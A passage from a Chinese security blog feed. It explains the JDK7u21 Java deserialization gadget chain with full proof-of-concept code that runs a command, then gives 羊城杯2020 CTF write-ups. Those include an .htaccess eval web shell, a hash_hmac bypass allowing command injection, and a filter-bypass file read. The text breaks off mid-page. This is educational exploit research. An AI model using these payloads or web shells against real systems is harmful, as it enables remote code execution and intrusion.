<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> TemplatesImpl <span class="title">getEvilTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();<span class="comment">//ClassPool对象是一个表示class文件的CtClass对象的容器</span></span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">&quot;Evil&quot;</span>);<span class="comment">//创建Evil类</span></span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));<span class="comment">//设置Evil类的父类为AbstractTranslet</span></span><br><span class="line">        CtConstructor cons = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[]&#123;&#125;, cc);<span class="comment">//创建无参构造函数</span></span><br><span class="line">        cons.setBody(<span class="string">&quot;&#123; Runtime.getRuntime().exec(\&quot;calc\&quot;); &#125;&quot;</span>);<span class="comment">//设置无参构造函数体</span></span><br><span class="line">        cc.addConstructor(cons);</span><br><span class="line">        <span class="keyword">byte</span>[] byteCode=cc.toBytecode();<span class="comment">//toBytecode得到Evil类的字节码</span></span><br><span class="line">        <span class="keyword">byte</span>[][] targetByteCode = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;byteCode&#125;;</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,targetByteCode);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;xx&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        TemplatesImpl templates=getEvilTemplatesImpl();</span><br><span class="line"></span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射创建代理使用的handler，AnnotationInvocationHandler作为动态代理的handler</span></span><br><span class="line">        Constructor ctor = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler tempHandler = (InvocationHandler) ctor.newInstance(Templates.class, map);</span><br><span class="line"></span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(Myjdk7u21.class.getClassLoader(), templates.getClass().getInterfaces(), tempHandler);</span><br><span class="line"></span><br><span class="line">        LinkedHashSet set = <span class="keyword">new</span> LinkedHashSet();</span><br><span class="line">        set.add(templates);</span><br><span class="line">        set.add(proxy);</span><br><span class="line"></span><br><span class="line">        map.put(<span class="string">&quot;f5a5a608&quot;</span>, templates);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] obj=serialize(set);</span><br><span class="line">        unserialize(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反序列化<code>LinkedHashSet</code>类就可以执行命令。</p><p>Java在反序列化的时候会调用<code>ObjectInputStream</code>类的<code>readObject()</code>方法，如果被反序列化的类重写了<code>readObject()</code>，那么该类在进行反序列化时，Java会优先调用重写的<code>readObject()</code>方法。</p><p><code>LinkedHashSet</code>类没有<code>readObject()</code>，但是它的父类<code>HashSet</code>存在<code>readObject()</code>，两者都继承了<code>Serializable接口</code></p><p><code>readObject()</code>中把Templates和proxy加入到map</p><p><img src="https://www.hualigs.cn/image/60860dff2a649.jpg">进入<code>put()</code>，</p><p>这里会和上一个 Entry 的 Key (templates) 进行比较，判断这两个对象是否相等，如果相等则新的替换老的值，然后返回老的值。</p><p>关键点在于<code>key.equals(k)</code>，添加的顺序是，前一个为 <code>templates</code> 后一个为<code>proxy</code>。</p><p>要到达<code>key.equals(k)</code>需要先满足条件<code>e.hash == hash</code>，也就是满足<code>hash(templates)== hash(proxy)</code>，这个条件下面再说</p><p><img src="https://www.hualigs.cn/image/60860dff2ac6e.jpg">根据<code>||</code>的规则，第一个值为false时才能进入第二个。此时，<code>key</code>等于<code>proxy</code>，<code>e.key</code>等于<code>templates</code>类，这样<code>(k = e.key) == key</code>返回<code>false</code>。进入<code>key.equals(k)</code></p><p><img src="https://www.hualigs.cn/image/60860dfb93047.jpg"></p><p><img src="https://www.hualigs.cn/image/60860dfca013a.jpg"></p><p>由于使用了动态代理，调用<code>Templates.equals()</code>就会进入<code>AnnotaionlnvocationHandler</code>的<code>invoke()</code>，然后因为满足if条件进入<code>equalsImpl</code>。</p><p>这里的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var1为当前proxy代理实例对象，等于之前的key</span><br><span class="line">var2为当前调用方法，等于equals方法对象</span><br><span class="line">var3为当前调用方法的传入参数列表，等于TemplatesImpl类，也就是之前的k和e.key</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/60860dffb6202.jpg"><img src="https://www.hualigs.cn/image/60860dfd0fbee.jpg"></p><p>sun.reflect.annotation.AnnotationInvocationHandler#equalsImpl</p><p>进入<code>equalsImpl()</code>，前两个条件都不满足，进入<code>getMemberMethods</code></p><p><img src="https://www.hualigs.cn/image/60860e00495d7.jpg"></p><p><img src="https://www.hualigs.cn/image/60860dfda31d0.jpg"></p><p><img src="https://www.hualigs.cn/image/60860dfda23b5.jpg"></p><p>sun.reflect.annotation.AnnotationInvocationHandler#getMemberMethods</p><p>满足条件<code>this.memberMethods</code>，<code>this.type</code>等于<code>Templates</code>，这样就会返回<code>Templates</code>中的所有方法，包括<code>getOutputProperties()</code></p><p><img src="https://www.hualigs.cn/image/60860dff52113.jpg"></p><p>回到<code>equalsImpl</code>，这里会获取<code>this.type</code>类中所有的方法，然后遍历并调用每一个方法。这里让<code>this.type</code>等于<code>Templates</code>接口就可以调用<code>Templates</code>中的所有方法，包括<code>getOutputProperties()</code>，触发payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Boolean <span class="title">equalsImpl</span><span class="params">(Object var1)</span> </span>&#123;<span class="comment">//var1等于构造好的templates</span></span><br><span class="line">    <span class="keyword">if</span> (var1 == <span class="keyword">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">this</span>.type.isInstance(var1)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Method[] var2 = <span class="keyword">this</span>.getMemberMethods();<span class="comment">//var2为Templates的所有方法</span></span><br><span class="line">        <span class="keyword">int</span> var3 = var2.length;<span class="comment">//var3为Templates方法的数量</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> var4 = <span class="number">0</span>; var4 &lt; var3; ++var4) &#123;<span class="comment">//迭代Templates的所有方法</span></span><br><span class="line">            Method var5 = var2[var4];<span class="comment">//var5为Templates的中的某个方法</span></span><br><span class="line">            String var6 = var5.getName();<span class="comment">//var6为该方法的名称</span></span><br><span class="line">            Object var7 = <span class="keyword">this</span>.memberValues.get(var6);<span class="comment">//在memberValues中获取key为var6的值，但memberValues只有一个key为f5a5a608的键值对，所以var7为null</span></span><br><span class="line">            Object var8 = <span class="keyword">null</span>;</span><br><span class="line">            AnnotationInvocationHandler var9 = <span class="keyword">this</span>.asOneOfUs(var1);<span class="comment">//var9也为null</span></span><br><span class="line">            <span class="keyword">if</span> (var9 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                var8 = var9.memberValues.get(var6);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var8 = var5.invoke(var1);<span class="comment">//运行会到这里，所以会调用Templates中的所有方法</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (InvocationTargetException var11) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IllegalAccessException var12) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(var12);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!memberValueEquals(var7, var8)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行成功</p><p><img src="https://www.hualigs.cn/image/60860e00d108d.jpg"></p><h1 id="Hash绕过"><a href="#Hash绕过" class="headerlink" title="Hash绕过"></a>Hash绕过</h1><p>java.util.HashMap#put</p><p>条件<code>e.hash == hash</code>，也就是满足<code>hash(templates)== hash(proxy)</code></p><p>调用了<code>hash()</code></p><p><img src="https://www.hualigs.cn/image/60860dfea0329.jpg"></p><p>java.util.HashMap#hash</p><p>进入<code>hash()</code>函数，这里调用了传入对象<code>k</code>的<code>hashCode()</code>方法，意味着有可能控制hash值，这里的<code>k</code>为创建的代理实例对象。接着调用了<code>hashCode</code></p><p><img src="https://www.hualigs.cn/image/60860dfea0750.jpg"></p><p>因为使用了动态代理，调用<code>hash(proxy)</code>时会自动跳转到<code>AnnotationInvocationHandler.invoke()</code></p><p>sun.reflect.annotation.AnnotationInvocationHandler#invoke</p><p><img src="https://www.hualigs.cn/image/60860dffcd946.jpg">sun.reflect.annotation.AnnotationInvocationHandler#hashCodeImpl</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">hashCodeImpl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> var1 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        Entry var3;</span><br><span class="line">        <span class="comment">//this.memberValues由构造函数传入的，可以控制，等于map</span></span><br><span class="line">        Iterator var2 = <span class="keyword">this</span>.memberValues.entrySet().iterator();<span class="comment">//获取遍历器</span></span><br><span class="line">        <span class="keyword">for</span>( ;var2.hasNext(); ) &#123;</span><br><span class="line">            var3 = (Entry)var2.next();</span><br><span class="line">            String key = var3.getKey();<span class="comment">//（可控map的键）</span></span><br><span class="line">            Object value = var3.getValue()；<span class="comment">//（可控map的值）</span></span><br><span class="line">            var1 += <span class="number">127</span> * </span><br><span class="line">                key.hashCode() ^    <span class="comment">//可控map的键 的 hashCode                </span></span><br><span class="line">                memberValueHashCode(value); <span class="comment">//可控map的值的 hashCode</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var1;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>sun.reflect.annotation.AnnotationInvocationHandler#memberValueHashCode</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">memberValueHashCode</span><span class="params">(Object var0)</span> </span>&#123;</span><br><span class="line">        Class var1 = var0.getClass();</span><br><span class="line">        <span class="keyword">if</span> (!var1.isArray()) &#123;<span class="comment">//不是数组的话获取传入值的hashCode。</span></span><br><span class="line">            <span class="keyword">return</span> var0.hashCode(); <span class="comment">//返回var0这个对象的hashCode</span></span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p>实际执行</p><p><strong>Proxy的hashCode = 127 * 可控键的hashCode ^ 可控值的hashCode == TemplatesImpl的hashCode</strong></p><p>只要让可控键的hashCode为0即可，利用<code>f5a5a608</code>的hashcode为0，字符串的hashcode也为0，在POC中构造<code>map.put(&quot;f5a5a608&quot;, templates)</code>,</p><p>这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var1 &#x3D; 127 * 0 ^ templates的hashCode</span><br><span class="line">var1 &#x3D; templates的hashCode</span><br></pre></td></tr></table></figure><h1 id="map-put"><a href="#map-put" class="headerlink" title="map.put"></a>map.put</h1><p>java.util.HashSet#add</p><p><img src="https://www.hualigs.cn/image/60860dfe68edf.jpg"></p><p>payload中把<code>map.put(&quot;f5a5a608&quot;, templates)</code>放在最后，这是因为<code>add</code>方法中调用了<code>map.put</code>，如果放在前面就会满足条件直接在本地触发命令执行，经过序列化之后的数据不能反序列化成功。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>羊城杯2020复现</title>
    <link href="/2021/04/23/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/04/23/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h1><p>给出源码，可以看到只能上传一个文件，并且文件名只能为<code>.xxxx</code>这种形式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$content</span>,<span class="string">&#x27;on&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;html&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;type&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;flag&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;upload&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents(<span class="variable">$filename</span>, <span class="variable">$content</span> . <span class="string">&quot;\nHello, world&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>利用<code>.htaccess</code>中的<code>auto_prepend_file</code>，在运行php文件前会自动包含指定的文件，这里过滤了<code>file</code>，可以用<code>\</code>绕过，把恶意代码注释掉，最后加上<code>\</code>转义，因为最后拼接上了<code>Hello, world</code>，需要加上\来换行注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_fi\</span><br><span class="line">le &quot;.htaccess&quot;</span><br><span class="line">#&lt;?php @eval($_GET[&#39;cmd&#39;]); ?&gt;\</span><br></pre></td></tr></table></figure><p>最终结果，运行任何一个php文件的时候都会自动包含.htaccess文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_fi\le &quot;.htaccess&quot;</span><br><span class="line">#&lt;?php @eval($_GET[&#39;cmd&#39;]); ?&gt;\Hello, world</span><br></pre></td></tr></table></figure><p>请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;adc3ba58-b6c5-466a-acb3-7d3434dafb0c.node3.buuoj.cn&#x2F;?filename&#x3D;.htaccess&amp;content&#x3D;php_value%20auto_prepend_fi\%0Ale%20%22.htaccess%22%0A%23%3C%3fphp%20%40eval(%24_GET[%27cmd%27])%3b%20%3f%3E\</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/60861093af5d8.jpg"></p><p>执行成功，接下来读取flag即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;adc3ba58-b6c5-466a-acb3-7d3434dafb0c.node3.buuoj.cn&#x2F;index.php?cmd&#x3D;phpinfo();</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/60861095d2236.jpg"></p><h1 id="Blackcat"><a href="#Blackcat" class="headerlink" title="Blackcat"></a>Blackcat</h1><p>查看源码发现<code>Hei_Mao_Jing_Chang.mp3</code>文件</p><p><img src="https://www.hualigs.cn/image/6086109441bec.jpg"></p><p>访问Hei_Mao_Jing_Chang.mp3得到源码</p><p><img src="https://www.hualigs.cn/image/6086109538553.jpg"></p><p><code>hash_hmac</code>函数会把第二个参数作为内容，第三个参数作为密钥，用第一个参数作为算法进行加密，我们只要给<code>$_POST[&#39;White-cat-monitor&#39;]</code>传入一个数组，hash_hmac函数就会返回null，这样密钥就可控了，我根据密钥加密要执行的命令，然后把加密后的hash传入<code>$_POST[&#39;Black-Cat-Sheriff&#39;]</code>即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>]) || <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;One-ear&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;谁！竟敢踩我一只耳的尾巴！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$clandestine</span> = getenv(<span class="string">&quot;clandestine&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;White-cat-monitor&#x27;</span>]))</span><br><span class="line">    <span class="variable">$clandestine</span> = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;White-cat-monitor&#x27;</span>], <span class="variable">$clandestine</span>); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$hh</span> = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;One-ear&#x27;</span>], <span class="variable">$clandestine</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$hh</span> !== <span class="variable">$_POST</span>[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">&quot;nc&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;One-ear&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>生成hash值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$hh</span> = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;One-ear&#x27;</span>], <span class="literal">null</span>);</span><br><span class="line">var_dump(<span class="variable">$hh</span>);</span><br></pre></td></tr></table></figure><p>post数据，buu的flag在env里</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Black-Cat-Sheriff&#x3D;afa668e24c118929d895750ef36b2a6382377049b3fe4a00f5a0dcdf2dc8b69a&amp;One-ear&#x3D;asd;env&amp;White-cat-monitor[]&#x3D;1</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/608610910d472.jpg"></p><h1 id="Easyphp2"><a href="#Easyphp2" class="headerlink" title="Easyphp2"></a>Easyphp2</h1><p>存在robots.txt</p><p><img src="https://img03.sogoucdn.com/app/a/100520146/D0B189B21794B126D071578055374C9B"></p><p>这里发现base64、rot13都被过滤，用url二次编码绕过，用<code>%6%32</code>代替<code>b</code>，<code>%32</code>解码为<code>2</code>，合并成<code>%62</code>解码为<code>b</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;17a28883-1f23-40fd-a3f6-98a5cf1cd5fc.node3.buuoj.cn&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.%6%32ase64-encode&#x2F;resource&#x3D;GWHT.php</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/6086109105504.jpg"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;count is here&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;style&gt;</span><br><span class="line"></span><br><span class="line">        html,</span><br><span class="line">        body &#123;</span><br><span class="line">            overflow: none;</span><br><span class="line">            max-height: <span class="number">100</span>vh;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body style=<span class="string">&quot;height: 100vh; text-align: center; background-color: green; color: blue; display: flex; flex-direction: column; justify-content: center;&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;center&gt;&lt;img src=<span class="string">&quot;question.jpg&quot;</span> height=<span class="string">&quot;200&quot;</span> width=<span class="string">&quot;200&quot;</span> /&gt; &lt;/center&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&#x27;pass&#x27;</span>] !== getenv(<span class="string">&#x27;PASS&#x27;</span>)) &#123;</span><br><span class="line">        setcookie(<span class="string">&#x27;pass&#x27;</span>, <span class="string">&#x27;PASS&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="string">&#x27;&lt;hacker&gt;&#x27;</span>.<span class="string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="string">&#x27;404&#x27;</span>.<span class="string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&#x27;Sorry, only people from GWHT are allowed to access this website.&#x27;</span>.<span class="string">&#x27;23333&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;A Counter is here, but it has someting wrong&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;input type=<span 